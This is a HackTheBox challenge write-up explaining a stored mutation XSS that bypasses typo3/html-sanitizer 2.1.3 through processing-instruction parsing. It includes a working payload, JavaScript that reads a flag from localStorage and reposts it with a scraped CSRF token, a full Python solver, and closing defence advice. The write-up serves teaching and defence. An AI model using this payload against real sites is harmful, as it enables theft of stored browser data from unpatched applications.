---
layout: post
title: "HackTheBox Challenge: Feedback Flux"
date: 2027-09-08 09:00:00 -0500
categories: [HackTheBox, Challenges]
tags: [hackthebox, challenge, web, xss, mutation-xss, sanitizer-bypass, cve-2024-25118, laravel]
---

## Overview

**Feedback Flux** is an Easy HackTheBox **Web** challenge. You submit "feedback" to a Laravel app; the server runs it through an allowlist HTML sanitizer and stores it, then a `/feedback` page renders every entry. An admin bot (headless Chrome) stashes the flag in `localStorage` and then browses `/feedback`. The whole challenge is one question: **can you smuggle JavaScript past the sanitizer so it runs in the bot's browser and reads that `localStorage` value?**

The answer is a [mutation XSS](https://cwe.mitre.org/data/definitions/79.html) ([CVE-2024-25118](https://nvd.nist.gov/vuln/detail/CVE-2024-25118)) in `typo3/html-sanitizer` v2.1.3 — a **parser differential** around DOM processing instructions — finished off with a same-origin self-exfil that needs no attacker server.

## The technique

The app sanitizes feedback with `typo3/html-sanitizer` v2.1.3 (which parses HTML with `masterminds/html5`) and a tight allowlist (`div`, `a`, `br`, a custom `typo3` tag). Then `index.blade.php` prints each entry with Blade's **raw** sink:

```php
{!! $feedback->feedback !!}
```

In `typo3/html-sanitizer` **≤2.1.3**, the node visitor only inspects `DOMCdataSection`, `DOMComment`, and `DOMElement`:

```php
// CommonVisitor::enterNode() (v2.1.3)
if (!$node instanceof DOMCdataSection
    && !$node instanceof DOMComment
    && !$node instanceof DOMElement) {
    return $node;   // a DOMProcessingInstruction passes through VERBATIM
}
```

A **DOM Processing Instruction** — `<?something ?>` — is none of those three, so it is returned **verbatim and unencoded**. The 2.1.4 fix adds exactly this missing case (`ENCODE_INVALID_PROCESSING_INSTRUCTION`); you can confirm the trigger without a PHP stack:

```bash
git clone https://github.com/TYPO3/html-sanitizer
git -C html-sanitizer diff v2.1.3 v2.1.4 -- src/   # the PI handling that was added
```

The bypass works because **the sanitizer's parser and the browser disagree** on where `<?…?>` ends:

| Parser | Reads `<?pi x="><img src=x onerror=…>"?>` as |
|---|---|
| `masterminds/html5` (sanitizer) | ONE inert processing-instruction node, terminated by `?>`. Nothing to strip. |
| A real browser (HTML5) | `<?` is a **bogus comment** ending at the **first `>`**; everything after is normal markup → `<img onerror=…>` is **live**. |

## Solution

**Detection oracle** — submit a benign probe and read the page source raw:

```
<?pi AAA="><bbb ccc=ddd>"?>
```

It comes back byte-for-byte (not `&lt;?pi…`) → the sanitizer is PI-vulnerable.

**Payload** — put a live `<img onerror>` after the first `>`. Single-quote the `onerror` value and write the JS using **only double quotes**, so the JS never closes the attribute:

```
<?pi x="><img src=x onerror='JS'>"?>
```

**Exfil without a listener.** The flag is in the bot's `localStorage` at the app origin, and our XSS runs same-origin. Instead of calling out to an attacker server, the `onerror` reads the flag, scrapes a fresh Laravel CSRF token from `GET /`, and POSTs the flag back as **new feedback** — which we then read from `/feedback`:

```js
fetch("/").then(r=>r.text()).then(t=>{
  var m=t.match(/_token" value="([^"]+)/);
  var b=new URLSearchParams();
  b.append("_token", m[1]);
  b.append("feedback", "PWNED_" + localStorage.getItem("flag"));
  fetch("/", {method:"POST", body:b});
});
```

The full working solver:

```python
#!/usr/bin/env python3
import os, re, time, requests
B = os.environ["FFBASE"]; s = requests.Session()

PAYLOAD = ('<?pi x="><img src=x onerror=\''
  'fetch("/").then(r=>r.text()).then(t=>{'
  'var m=t.match(/_token" value="([^"]+)/);'
  'var b=new URLSearchParams();'
  'b.append("_token",m[1]);'
  'b.append("feedback","PWNED_"+localStorage.getItem("flag"));'
  'fetch("/",{method:"POST",body:b})})\'>"?>')

def csrf():
    return re.search(r'name="_token"\s+value="([^"]+)"', s.get(B+"/").text).group(1)

s.post(B+"/", data={"_token": csrf(), "feedback": PAYLOAD})   # store XSS; admin bot runs
for _ in range(15):
    time.sleep(2)
    m = re.search(r'PWNED_(HTB\{[^}]*\})', s.get(B+"/feedback").text)
    if m:
        print("FLAG:", m.group(1)); break
```

```
$ FFBASE=http://<ip>:<port> python3 solve.py
FLAG: HTB{...}
```

Tip: validate the browser parse offline before spending a live shot — `chromium --headless --dump-dom` on a stub page wrapping the sanitized output will fire the `onerror` and prove the differential.

## Why it worked

An allowlist sanitizer is only as safe as the agreement between **its** parser's DOM and the **browser's** DOM. `typo3/html-sanitizer` ≤2.1.3 never modelled processing-instruction nodes, so it passed them through untouched while believing they were harmless — and the browser turned them into live markup. Combined with a raw Blade sink and a same-origin admin bot holding the flag, that single missing node type is full stored XSS.

## Fix / defense

- Upgrade `typo3/html-sanitizer` to **≥2.1.4 / ≥1.5.3** (PI nodes are now encoded).
- Don't render user content through a raw sink — prefer auto-escaped `{{ $feedback->feedback }}` and rebuild allowed markup from a strict model.
- Add a CSP without `unsafe-inline`; the `onerror` handler can't run even if injected.
- Generalize: every node class an allowlist doesn't explicitly model — processing instructions, CDATA, comments, `<svg>`/`<math>` foreign-namespace — is a mutation-XSS candidate. Audit a sanitizer by diffing its parser's output against the browser's.
